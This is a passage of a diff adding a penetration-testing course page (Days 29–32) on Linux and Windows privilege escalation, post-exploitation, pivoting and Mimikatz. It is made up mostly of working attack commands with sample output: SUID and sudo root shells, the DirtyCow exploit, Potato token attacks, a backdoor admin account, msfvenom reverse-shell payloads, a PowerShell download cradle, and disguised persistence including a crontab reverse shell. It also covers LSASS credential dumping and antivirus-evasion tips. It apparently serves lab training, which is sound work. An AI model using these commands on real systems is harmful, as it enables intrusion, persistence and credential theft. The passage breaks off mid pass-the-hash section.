+<span class="hl2">bash-4.4#</span> <span class="cm">id</span>  → <span class="hl2">euid=0(root)</span>
+
+<span class="co"># ── SCENARIO: vim has SUID bit ───────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">vim -c ':!/bin/bash -p'</span>
+
+<span class="co"># ── SCENARIO: sudo -l shows (root) NOPASSWD: /usr/bin/awk ───</span>
+<span class="pr">$</span> <span class="cm">sudo awk 'BEGIN {system("/bin/bash")}'</span>
+<span class="hl2">root@machine#</span>     <span class="co"># Full root shell via GTFOBins awk technique</span>
+
+<span class="co"># ── SCENARIO: sudo -l shows (root) NOPASSWD: /usr/bin/less ──</span>
+<span class="pr">$</span> <span class="cm">sudo less /etc/profile</span>
+<span class="co"># Inside less: press 'v' to open editor, then :!/bin/bash</span>
+<span class="hl2">root@machine#</span>
+
+<span class="co"># ── SCENARIO: Writable cron script ────────────────────────────
+# /etc/crontab: * * * * * root /opt/backup.sh
+# ls -la /opt/backup.sh: -rwxrwxrwx (world writable!)</span>
+<span class="pr">$</span> <span class="cm">echo 'chmod +s /bin/bash' >> /opt/backup.sh</span>
+<span class="co"># Wait 60 seconds for cron to execute as root...</span>
+<span class="pr">$</span> <span class="cm">ls -la /bin/bash</span>
+<span class="ham">-rwsr-xr-x root root /bin/bash</span>    <span class="hc">← SUID bit set by root's cron job</span>
+<span class="pr">$</span> <span class="cm">/bin/bash -p</span>
+<span class="hl2">bash-4.4#</span> <span class="cm">id</span>  → <span class="hl2">euid=0(root)</span></div>
+  </div>
+
+  <div class="slbl">// 29.4 — DIRTYCOW: KERNEL EXPLOIT EXAMPLE</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">KERNEL EXPLOIT — CVE-2016-5195 (DirtyCow)</div></div>
+    <div class="tbody"><span class="co"># Check kernel version first:</span>
+<span class="pr">$</span> <span class="cm">uname -a</span>
+<span class="ha">Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP x86_64 GNU/Linux</span>
+<span class="co"># Kernel 4.4.0-21 → vulnerable to DirtyCow (needs &lt; 4.8.3)</span>
+
+<span class="co"># Use local_exploit_suggester in Meterpreter to find applicable exploits:</span>
+<span class="pr">meterpreter></span> <span class="cm">run post/multi/recon/local_exploit_suggester</span>
+<span class="ha">[+] exploit/linux/local/bpf_sign_extension_priv_esc: appears to be vulnerable
+[+] exploit/linux/local/dirty_cow: appears to be vulnerable
+[+] exploit/linux/local/su_login: appears to be vulnerable</span>
+
+<span class="co"># Compile and run DirtyCow manually:</span>
+<span class="pr">target$</span> <span class="cm">wget https://dirtycow.ninja/dirtyc0w.c</span>
+<span class="pr">target$</span> <span class="cm">gcc -pthread dirtyc0w.c -o dirty -lcrypt</span>
+<span class="pr">target$</span> <span class="cm">./dirty password123</span>
+<span class="ham">Backing up /usr/bin/passwd to /tmp/bak
+Please wait...(may take several minutes)
+/etc/passwd successfully backed up to /tmp/passwd
+New password: password123
+Complete! You can log in with user 'firefart' and password 'password123'.</span>
+<span class="pr">target$</span> <span class="cm">su firefart</span>     <span class="co"># firefart = root-equivalent user created by exploit</span>
+<span class="hl2">root@target#</span>
+
+<span class="co"># RESTORE after demo (critical in real pentest — always clean up):</span>
+<span class="pr">root@target#</span> <span class="cm">cp /tmp/passwd /etc/passwd</span></div>
+  </div>
+
+  <div class="slbl">// DAY 29 — QUIZ</div>
+  <div class="qb">
+    <div class="qt"><code>sudo -l</code> shows: <code>(root) NOPASSWD: /usr/bin/python3 /opt/monitor.py</code>. The file <code>/opt/monitor.py</code> is owned by root and not writable. How do you escalate to root?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','The script itself is not writable — you can\'t modify it directly. But the restriction specifies a full path to python3 AND the script. Look at what the script might import.')"><span class="qk">A</span> Modify /opt/monitor.py to include a bash shell — you have write access because sudo grants it</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Python Library Hijacking. When Python runs, it searches for imported modules in the current directory FIRST (before system paths). If /opt/monitor.py contains <code>import subprocess</code> (or any import), create a file called <code>subprocess.py</code> in /opt/ (if writable) or in the directory where sudo runs from, containing: <code>import os; os.system("/bin/bash")</code>. When sudo runs python3 /opt/monitor.py, Python finds YOUR subprocess.py first, executes it as root. Check what the script imports: <code>cat /opt/monitor.py</code>. Then create the hijack module in a writable directory that\'s on the Python path.')"><span class="qk">B</span> Check what modules monitor.py imports, create a malicious module with the same name in a writable directory Python searches first (library hijacking)</div>
+      <div class="qo" onclick="qa(this,'wrong','Kernel exploits are valid but should be a last resort — they risk system instability. The sudo misconfiguration gives you a cleaner path that doesn\'t require kernel exploitation.')"><span class="qk">C</span> Use a kernel exploit — the sudo restriction means you must go deeper</div>
+      <div class="qo" onclick="qa(this,'wrong','sudo python3 /opt/monitor.py -c "..." — the sudo rule specifies exactly that command including the script path. Adding flags not in the sudo rule will be rejected by sudo.')"><span class="qk">D</span> Run <code>sudo python3 /opt/monitor.py -c "import os;os.system('/bin/bash')"</code> to pass code via arguments</div>
+    </div>
+    <div class="qfb" id="q0"></div>
+  </div>
+
+  <div class="slbl">// DAY 29 — LAB</div>
+  <div class="card">
+    <div class="clbl">LAB TASKS</div>
+    <ul class="ck">
+      <li>On Metasploitable: get a shell via vsftpd. Upload and run linpeas.sh. Document every RED/YELLOW finding.</li>
+      <li>Find SUID binaries: <code>find / -perm -4000 2>/dev/null</code>. Look each up on gtfobins.github.io. Exploit at least one to get a root shell.</li>
+      <li>Run <code>sudo -l</code>. Can your user run anything as root? Check GTFOBins for each allowed binary.</li>
+      <li>Check <code>/etc/crontab</code> and <code>/etc/cron.d/</code>. Are any scripts writable? Demonstrate the write-to-script technique.</li>
+      <li>TryHackMe room: <strong>"Linux PrivEsc"</strong> — structured lab with 10+ escalation vectors to find and exploit.</li>
+    </ul>
+  </div>
+</div><!-- /p0 -->
+
+
+<!-- ═══════════════ DAY 30 ═══════════════ -->
+<div class="pnl" id="p1">
+  <div class="dh">
+    <div class="dnum">30</div>
+    <div class="dinfo">
+      <h2>WINDOWS PRIVILEGE ESCALATION</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> Token Impersonation · Unquoted Paths · DLL Hijacking · AlwaysInstallElevated</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 PROGRESS — DAY 30 OF 35</div><div class="pbt"><div class="pbf" style="width:86%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🪟</div>
+    <p><strong>Windows privesc is a different beast.</strong> The Windows security model — tokens, ACLs, services, registry — creates a uniquely rich attack surface. The most reliable technique in modern engagements is <span class="hl">token impersonation</span> — if you have SeImpersonatePrivilege (which service accounts like IIS and SQL Server always have), you can become SYSTEM in seconds.</p>
+  </div>
+
+  <div class="slbl">// 30.1 — WINPEAS: AUTOMATED WINDOWS ENUMERATION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">WINPEAS — WINDOWS PRIVILEGE ESCALATION AWESOME SCRIPTS</div></div>
+    <div class="tbody"><span class="co"># Download to target via Meterpreter upload or PowerShell:</span>
+<span class="pr">meterpreter></span> <span class="cm">upload /opt/winpeas.exe C:\\Windows\\Temp\\wp.exe</span>
+<span class="pr">meterpreter></span> <span class="cm">shell</span>
+<span class="pr">C:\></span> <span class="cm">C:\Windows\Temp\wp.exe</span>
+
+<span class="co"># Or download from target (if internet access):</span>
+<span class="pr">C:\></span> <span class="cm">powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.100:8000/winpeas.ps1')"</span>
+
+<span class="co"># Key findings winpeas checks:</span>
+<span class="ham">Token Privileges: SeImpersonatePrivilege (Enabled)</span>   <span class="hc">← use PrintSpoofer/GodPotato</span>
+<span class="hc">Unquoted Service Path: C:\Program Files\My App\service.exe</span>
+<span class="ham">AlwaysInstallElevated: HKLM = 1, HKCU = 1</span>           <span class="hc">← MSI install = SYSTEM</span>
+<span class="ha">Stored Credentials: cmdkey /list shows entries</span>
+<span class="hc">DLL Hijacking opportunity in service PATH</span></div>
+  </div>
+
+  <div class="slbl">// 30.2 — TOKEN IMPERSONATION (THE MOST RELIABLE TECHNIQUE)</div>
+  <div class="card">
+    <div class="clbl">HOW TOKEN IMPERSONATION WORKS</div>
+    <p>Windows access tokens represent the security context of a process. Service accounts (IIS, MSSQL, network services) are granted <span class="hl">SeImpersonatePrivilege</span> — they can impersonate any user who connects to them. Potato attacks exploit this: create a fake COM server that SYSTEM connects to, then impersonate SYSTEM.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">TOKEN IMPERSONATION — PRINTSPOOFER & GODPOTATO</div></div>
+    <div class="tbody"><span class="co"># First — check if we have the privilege:</span>
+<span class="pr">C:\></span> <span class="cm">whoami /priv</span>
+<span class="ha">PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description               State
+============================= ========================= ========
+SeImpersonatePrivilege        Impersonate a client      Enabled</span>   <span class="hc">← EXPLOITABLE</span>
+
+<span class="co"># PrintSpoofer (Windows 10/Server 2019+):</span>
+<span class="pr">C:\></span> <span class="cm">PrintSpoofer.exe -i -c cmd</span>
+<span class="hl2">[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.1577]
+C:\Windows\system32> whoami</span>
+<span class="hl2">nt authority\system</span>     <span class="hc">← SYSTEM in 3 seconds</span>
+
+<span class="co"># GodPotato (works on Windows 2012-2022, all versions):</span>
+<span class="pr">C:\></span> <span class="cm">GodPotato.exe -cmd "cmd /c whoami"</span>
+<span class="hl2">nt authority\system</span>
+
+<span class="co"># Add a backdoor admin account as SYSTEM:</span>
+<span class="pr">C:\></span> <span class="cm">GodPotato.exe -cmd "cmd /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add"</span>
+<span class="hl2">[+] Command: cmd /c net user backdoor P@ssw0rd123! /add
+[+] CreateProcessAsUser OK
+The command completed successfully.  ← admin account created</span></div>
+  </div>
+
+  <div class="slbl">// 30.3 — UNQUOTED SERVICE PATHS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">UNQUOTED SERVICE PATH EXPLOITATION</div></div>
+    <div class="tbody"><span class="co"># Windows resolves unquoted paths with spaces by trying each segment:
+# Service: C:\Program Files\My Application\service.exe
+# Windows tries these IN ORDER:
+#   1. C:\Program.exe
+#   2. C:\Program Files\My.exe        ← if this exists, IT runs as SYSTEM!
+#   3. C:\Program Files\My Application\service.exe</span>
+
+<span class="co"># Find unquoted service paths:</span>
+<span class="pr">C:\></span> <span class="cm">wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "c:\windows" | findstr /iv """</span>
+<span class="ham">Vulnerable Service   C:\Program Files\My Application\bin\service.exe  Auto</span>
+
+<span class="co"># Check write permissions on the path:</span>
+<span class="pr">C:\></span> <span class="cm">icacls "C:\Program Files\My Application\"</span>
+<span class="hc">BUILTIN\Users:(W)   ← Users can write here!</span>
+
+<span class="co"># Generate malicious executable:</span>
+<span class="pr">kali$</span> <span class="cm">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o My.exe</span>
+
+<span class="co"># Upload to target path and restart service:</span>
+<span class="pr">C:\></span> <span class="cm">copy My.exe "C:\Program Files\My.exe"</span>
+<span class="pr">C:\></span> <span class="cm">sc stop "Vulnerable Service" && sc start "Vulnerable Service"</span>
+<span class="co"># Service starts → Windows finds My.exe first → your shell runs as SYSTEM</span></div>
+  </div>
+
+  <div class="slbl">// 30.4 — ALWAYSINSTALLELEVATED</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">ALWAYSINSTALLELEVATED — MSI FILES AS SYSTEM</div></div>
+    <div class="tbody"><span class="co"># Check if both registry keys are set to 1 (both required):</span>
+<span class="pr">C:\></span> <span class="cm">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="ham">AlwaysInstallElevated    REG_DWORD    0x1</span>
+<span class="pr">C:\></span> <span class="cm">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="ham">AlwaysInstallElevated    REG_DWORD    0x1</span>
+
+<span class="co"># Generate malicious MSI installer:</span>
+<span class="pr">kali$</span> <span class="cm">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f msi -o evil.msi</span>
+
+<span class="co"># Install on target (runs as SYSTEM due to policy):</span>
+<span class="pr">C:\></span> <span class="cm">msiexec /quiet /qn /i C:\Temp\evil.msi</span>
+<span class="hl2"># Shell received as: nt authority\system</span></div>
+  </div>
+
+  <div class="slbl">// DAY 30 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You have a shell as <code>IIS APPPOOL\DefaultAppPool</code> on a Windows Server 2019 web server. <code>whoami /priv</code> shows <code>SeImpersonatePrivilege: Enabled</code>. You upload GodPotato.exe but Windows Defender flags and deletes it. What is your next approach?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Giving up when Defender catches one tool is never the answer — there are always alternatives. AV evasion is a core skill you learn in Week 6.')"><span class="qk">A</span> Give up — Windows Defender means privilege escalation isn\'t possible</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Multiple approaches: (1) Try other Potato variants — PrintSpoofer, JuicyPotato (older Windows), SweetPotato, RemotePotato0 — each uses different techniques and AV signatures differ. (2) Obfuscate the binary: compile from source with custom strings, use a C# variant and compile in memory. (3) Use Meterpreter\'s built-in token impersonation: load incognito → list_tokens -u → impersonate_token "NT AUTHORITY\\SYSTEM" (works if a SYSTEM token is available). (4) Use PowerShell-based alternatives that don\'t require dropping an EXE — some variants work entirely in memory. (5) Disable Defender if you have registry access: reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f — though this requires admin rights you\'re trying to gain.')"><span class="qk">B</span> Try other Potato variants (PrintSpoofer, SweetPotato), use Meterpreter\'s incognito module for in-memory token manipulation, or try PowerShell-based approaches</div>
+      <div class="qo" onclick="qa(this,'wrong','Disabling Defender requires registry modification rights that typically require admin access — the very thing you\'re trying to achieve. Chicken-and-egg problem.')"><span class="qk">C</span> Disable Windows Defender first using a registry key, then run GodPotato</div>
+      <div class="qo" onclick="qa(this,'wrong','Kernel exploits are a last resort because they risk BSOD and system crashes in production environments. With SeImpersonatePrivilege available, token impersonation is the right path — just needs a different tool.')"><span class="qk">D</span> Switch immediately to a kernel exploit — token impersonation is blocked</div>
+    </div>
+    <div class="qfb" id="q1"></div>
+  </div>
+</div><!-- /p1 -->
+
+
+<!-- ═══════════════ DAY 31 ═══════════════ -->
+<div class="pnl" id="p2">
+  <div class="dh">
+    <div class="dnum">31</div>
+    <div class="dinfo">
+      <h2>POST-EXPLOITATION I</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> Meterpreter Commands · Hashdump · Persistence · Pivoting Concepts</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 PROGRESS — DAY 31 OF 35</div><div class="pbt"><div class="pbf" style="width:88%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🕳️</div>
+    <p><strong>Root is not the end goal — intelligence and persistence are.</strong> Professional red teamers don't just escalate and screenshot. They enumerate the internal network, harvest credentials, establish persistence, and map paths to the highest-value targets (Domain Controller, financial systems, source code). This is where you transition from "hacker" to "threat actor simulation."</p>
+  </div>
+
+  <div class="slbl">// 31.1 — POST-EXPLOITATION OBJECTIVES</div>
+  <table class="tbl">
+    <tr><th>OBJECTIVE</th><th>WHY IT MATTERS</th><th>TOOL/TECHNIQUE</th></tr>
+    <tr><td><span class="hl">Situational Awareness</span></td><td>Where are you? What network? Who else is here? What's connected?</td><td>sysinfo, ipconfig, arp, route print, netstat</td></tr>
+    <tr><td><span class="hl">Credential Harvesting</span></td><td>Every credential found enables lateral movement or escalation</td><td>hashdump, Mimikatz, LaZagne, browser credential dumpers</td></tr>
+    <tr><td><span class="hl">Persistence</span></td><td>Survive reboots — clients patch fast after incidents</td><td>Registry run keys, scheduled tasks, service installation, startup folder</td></tr>
+    <tr><td><span class="hl">Internal Recon</span></td><td>Enumerate the internal network that was invisible from outside</td><td>arp_scanner, port_scan, ping sweep</td></tr>
+    <tr><td><span class="hl">Data Exfiltration Proof</span></td><td>Demonstrate business impact — what data could an attacker take?</td><td>download sensitive files, database dumps</td></tr>
+    <tr><td><span class="hl">Pivoting Setup</span></td><td>Use compromised host as gateway to reach isolated network segments</td><td>route add, socks proxy, port forwarding</td></tr>
+  </table>
+
+  <div class="slbl">// 31.2 — SITUATIONAL AWARENESS COMMANDS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">POST-EXPLOITATION — INTERNAL RECON</div></div>
+    <div class="tbody"><span class="co"># ── METERPRETER BUILT-INS ────────────────────────────────────</span>
+<span class="pr">meterpreter></span> <span class="cm">sysinfo</span>
+<span class="ha">Computer  : WIN-DC01
+OS        : Windows 2019 (10.0 Build 17763)
+Domain    : CORP.LOCAL</span>    <span class="hc">← you're on the domain controller!</span>
+
+<span class="pr">meterpreter></span> <span class="cm">ipconfig</span>
+<span class="ha">Interface 1: Ethernet
+  IP Address  : 10.10.10.5
+  Subnet Mask : 255.255.255.0</span>
+<span class="ha">Interface 2: Ethernet (Internal)
+  IP Address  : 192.168.100.5    ← second network interface → pivot target</span>
+
+<span class="pr">meterpreter></span> <span class="cm">arp</span>
+<span class="ha">IP Address       MAC Address       Interface
+10.10.10.1       00:50:56:e5:aa:11 Ethernet
+10.10.10.20      00:50:56:b3:cc:22 Ethernet   ← another host on the network
+10.10.10.50      00:50:56:a1:dd:33 Ethernet</span>
+
+<span class="co"># ── INTERNAL PORT SCAN FROM METERPRETER ──────────────────────</span>
+<span class="pr">meterpreter></span> <span class="cm">run post/multi/gather/ping_sweep RHOSTS=10.10.10.0/24</span>
+<span class="ha">[+] 10.10.10.1 host found
+[+] 10.10.10.5 host found
+[+] 10.10.10.20 host found
+[+] 10.10.10.50 host found</span>
+
+<span class="pr">meterpreter></span> <span class="cm">run post/multi/gather/port_scan RHOSTS=10.10.10.20 PORTS=22,80,445,3389,1433</span>
+<span class="ha">[+] 10.10.10.20:445 is open   ← SMB — probably another Windows machine
+[+] 10.10.10.20:3389 is open  ← RDP — can we RDP with harvested creds?
+[+] 10.10.10.20:1433 is open  ← MSSQL — database server</span></div>
+  </div>
+
+  <div class="slbl">// 31.3 — PERSISTENCE MECHANISMS</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">PERSISTENCE — SURVIVING REBOOTS</div></div>
+    <div class="tbody"><span class="co"># ── WINDOWS: Registry Run Key (most common) ───────────────────</span>
+<span class="pr">C:\></span> <span class="cm">reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f</span>
+<span class="co"># Runs shell.exe as current user on every login
+# Use HKLM for system-wide (requires admin)</span>
+
+<span class="co"># ── WINDOWS: Scheduled Task ───────────────────────────────────</span>
+<span class="pr">C:\></span> <span class="cm">schtasks /create /sc onlogon /tn "WindowsDefenderUpdate" /tr "C:\Windows\Temp\shell.exe" /ru SYSTEM /f</span>
+<span class="co"># Runs as SYSTEM on every login — stealthier than run keys</span>
+
+<span class="co"># ── LINUX: Crontab persistence ────────────────────────────────</span>
+<span class="pr">root#</span> <span class="cm">echo "* * * * * /tmp/.hidden_shell" >> /etc/crontab</span>
+<span class="pr">root#</span> <span class="cm">echo "bash -i >& /dev/tcp/192.168.56.100/4444 0>&1" > /tmp/.hidden_shell</span>
+<span class="pr">root#</span> <span class="cm">chmod +x /tmp/.hidden_shell</span>
+<span class="co"># Reverse shell reconnects every minute even after reboot</span>
+
+<span class="co"># ── LINUX: SSH authorized_keys (most stable persistence) ─────</span>
+<span class="pr">root#</span> <span class="cm">echo "ssh-rsa AAAA[your_public_key]" >> /root/.ssh/authorized_keys</span>
+<span class="co"># SSH in directly any time: ssh -i your_private_key root@target</span>
+<span class="co"># Survives reboots, doesn't create noisy connections</span>
+
+<span class="co"># ── METERPRETER: persistence module ─────────────────────────</span>
+<span class="pr">meterpreter></span> <span class="cm">run post/windows/manage/persistence_exe STARTUP=SCHEDULER SCHEDULE_TYPE=ONLOGON LOCALEXEPATH=C:\\Windows\\Temp\\shell.exe</span>
+<span class="ham">[+] Scheduled task created: WindowsUpdate</span></div>
+  </div>
+
+  <div class="slbl">// 31.4 — PIVOTING: REACHING ISOLATED NETWORKS</div>
+  <div class="card">
+    <div class="clbl">PIVOTING CONCEPT</div>
+    <p>Your Kali machine can't reach <code>192.168.100.0/24</code> directly. But the compromised Windows machine has an interface on both <code>10.10.10.0/24</code> (where you are) AND <code>192.168.100.0/24</code> (the internal segment). You use the compromised host as a proxy — routing your traffic through it to reach previously unreachable targets.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">PIVOTING VIA METERPRETER ROUTE</div></div>
+    <div class="tbody"><span class="co"># Add a route through the Meterpreter session to reach the internal network:</span>
+<span class="pr">msf6></span> <span class="cm">route add 192.168.100.0/24 1</span>   <span class="co"># session 1 is our meterpreter</span>
+<span class="ha">[*] Route added</span>
+
+<span class="co"># Now scan through the pivot:</span>
+<span class="pr">msf6></span> <span class="cm">use auxiliary/scanner/portscan/tcp</span>
+<span class="pr">msf6></span> <span class="cm">set RHOSTS 192.168.100.0/24</span>
+<span class="pr">msf6></span> <span class="cm">set PORTS 22,80,443,445,3389</span>
+<span class="pr">msf6></span> <span class="cm">run</span>
+<span class="ha">[+] 192.168.100.10:445 - TCP OPEN   ← reachable through pivot!</span>
+<span class="ha">[+] 192.168.100.10:3389 - TCP OPEN</span>
+
+<span class="co"># SOCKS proxy pivot — route ALL tools through pivot (nmap, Burp, browser):</span>
+<span class="pr">msf6></span> <span class="cm">use auxiliary/server/socks_proxy</span>
+<span class="pr">msf6></span> <span class="cm">set SRVPORT 1080</span>
+<span class="pr">msf6></span> <span class="cm">run -j</span>
+<span class="co"># Configure proxychains to use 127.0.0.1:1080
+# Then: proxychains nmap 192.168.100.10
+# Or:   proxychains firefox (browse internal web apps)</span></div>
+  </div>
+
+  <div class="slbl">// DAY 31 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">After compromising a web server, <code>ipconfig</code> reveals two network interfaces: <code>10.0.0.5</code> (DMZ — where you came from) and <code>172.16.0.5</code> (internal corporate network — unreachable from your Kali). What is the correct Metasploit command sequence to scan the internal 172.16.0.0/24 network through your Meterpreter session (session ID 1)?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','You can\'t nmap the internal network directly from Kali — it\'s not reachable. The route must be added through the Meterpreter session first.')"><span class="qk">A</span> Run <code>nmap -sV 172.16.0.0/24</code> from Kali — the route is automatic once you have a session</div>
+      <div class="qo" onclick="qa(this,'wrong','Sessions -i 1 enters the session — but that gives you a shell on 10.0.0.5, not the ability to scan from Kali through the pivot. You need to add the route at the MSF level.')"><span class="qk">B</span> <code>sessions -i 1</code> then run ipconfig in the session to scan from the compromised host</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Step 1: Background the session if in meterpreter (Ctrl+Z). Step 2: <code>route add 172.16.0.0/24 1</code> — tells Metasploit to route traffic for that subnet through session 1 (the pivot). Step 3: Use any MSF scanner module with RHOSTS set to 172.16.0.0/24 — traffic flows through the pivot automatically. For non-MSF tools: additionally set up a SOCKS proxy (auxiliary/server/socks_proxy on port 1080) and use proxychains. The key insight: you\'re not running tools on the pivot — you\'re tunneling Kali\'s traffic through the pivot to reach previously unreachable hosts.')"><span class="qk">C</span> Background the session, run <code>route add 172.16.0.0/24 1</code>, then use MSF scanner modules with RHOSTS set to the internal range</div>
+      <div class="qo" onclick="qa(this,'wrong','Port forwarding (portfwd) forwards a specific port from a specific host to your Kali — useful for a single known target. For scanning an entire unknown subnet, routing + scanner modules is the correct approach.')"><span class="qk">D</span> Use <code>portfwd add -l 8080 -p 80 -r 172.16.0.5</code> to forward each host individually</div>
+    </div>
+    <div class="qfb" id="q2"></div>
+  </div>
+</div><!-- /p2 -->
+
+
+<!-- ═══════════════ DAY 32 ═══════════════ -->
+<div class="pnl" id="p3">
+  <div class="dh">
+    <div class="dnum">32</div>
+    <div class="dinfo">
+      <h2>MIMIKATZ & CREDENTIAL HARVESTING</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> sekurlsa · LSASS · Pass-the-Hash · Pass-the-Ticket · Credential Hunting</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 PROGRESS — DAY 32 OF 35</div><div class="pbt"><div class="pbf" style="width:91%"></div></div></div>
+
+  <div class="note nd">
+    <div class="nico">💎</div>
+    <p><strong>Mimikatz changed everything.</strong> In 2011, Benjamin Delpy released a tool that could extract Windows plaintext passwords, NTLM hashes, and Kerberos tickets directly from LSASS (Local Security Authority Subsystem Service) memory. Windows was storing credentials in a reversible form for convenience — Mimikatz made that catastrophic. Even after Microsoft's WDigest mitigations, Mimikatz remains the most powerful credential harvesting tool in existence.</p>
+  </div>
+
+  <div class="slbl">// 32.1 — HOW MIMIKATZ WORKS</div>
+  <div class="card">
+    <div class="clbl">LSASS MEMORY READING</div>
+    <p>LSASS (lsass.exe) is a critical Windows process that manages authentication. It keeps credentials in memory to enable Single Sign-On. Mimikatz reads LSASS memory to extract these credentials. Requires <span class="hl">SYSTEM or SeDebugPrivilege</span> — which you get after privilege escalation.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">MIMIKATZ — COMPLETE CREDENTIAL EXTRACTION</div></div>
+    <div class="tbody"><span class="co"># Launch Mimikatz (on compromised Windows machine as SYSTEM):</span>
+<span class="pr">C:\></span> <span class="cm">mimikatz.exe</span>
+<span class="ha">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
+ ## \ / ##
+ '## v ##'
+  '#####'</span>
+
+<span class="co"># ── Enable debug privilege (required) ────────────────────────</span>
+<span class="ha">mimikatz #</span> <span class="cm">privilege::debug</span>
+<span class="hl2">Privilege '20' OK</span>
+
+<span class="co"># ── Extract ALL credentials from LSASS ──────────────────────</span>
+<span class="ha">mimikatz #</span> <span class="cm">sekurlsa::logonpasswords</span>
+<span class="ham">Authentication Id : 0 ; 287634 (00000000:00046512)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : CORP
+Logon Server      : WIN-DC01</span>
+<span class="hc">        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : CORP
+         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c</span>
+<span class="hl2">        wdigest :
+         * Username : Administrator
+         * Domain   : CORP
+         * Password : SuperSecret2024!</span>   <span class="hc">← PLAINTEXT! (WDigest enabled)</span>
+<span class="hc">        kerberos :
+         * Username : Administrator
+         * Domain   : CORP.LOCAL
+         * Password : SuperSecret2024!</span>
+
+<span class="co"># ── Dump local SAM database (local accounts) ─────────────────</span>
+<span class="ha">mimikatz #</span> <span class="cm">token::elevate</span>        <span class="co"># Elevate to SYSTEM token</span>
+<span class="ha">mimikatz #</span> <span class="cm">lsadump::sam</span>
+<span class="ham">RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c</span>
+
+<span class="co"># ── Extract Kerberos tickets from memory ─────────────────────</span>
+<span class="ha">mimikatz #</span> <span class="cm">sekurlsa::tickets /export</span>
+<span class="hl2">[00000000] - 0x00000012 - aes256_hmac
+ Start/End/MaxRenew: ...
+ Service Name: krbtgt/CORP.LOCAL
+ → Saved to: [0;3e7]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi</span>
+<span class="co"># .kirbi file = full Kerberos ticket → use for Pass-the-Ticket attack</span>
+
+<span class="co"># ── Via Meterpreter (no binary needed) ───────────────────────</span>
+<span class="pr">meterpreter></span> <span class="cm">load kiwi</span>   <span class="co"># kiwi = Mimikatz integrated into Meterpreter</span>
+<span class="pr">meterpreter></span> <span class="cm">creds_all</span>   <span class="co"># Equivalent to sekurlsa::logonpasswords</span>
+<span class="pr">meterpreter></span> <span class="cm">lsa_dump_sam</span></div>
+  </div>
+
+  <div class="slbl">// 32.2 — PASS-THE-HASH (PTH)</div>
+  <div class="card">
+    <div class="clbl">AUTHENTICATING WITHOUT CRACKING</div>
+    <p>Windows NTLM authentication doesn't require the cleartext password — it requires the <span class="hl">hash</span>. If you have an NTLM hash from Mimikatz, you can authenticate as that user <span class="hl">without cracking it</span>. This is Pass-the-Hash — one of the most impactful lateral movement techniques in Windows environments.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">PASS-THE-HASH — LATERAL MOVEMENT WITHOUT CRACKING</div></div>
+    <div class="tbody"><span class="co"># You have: Administrator NTLM hash = 8846f7eaee8fb117ad06bdd830b7586c</span>
+<span class="co"># Target machine: 10.10.10.20 (running SMB, same local admin password)</span>
+
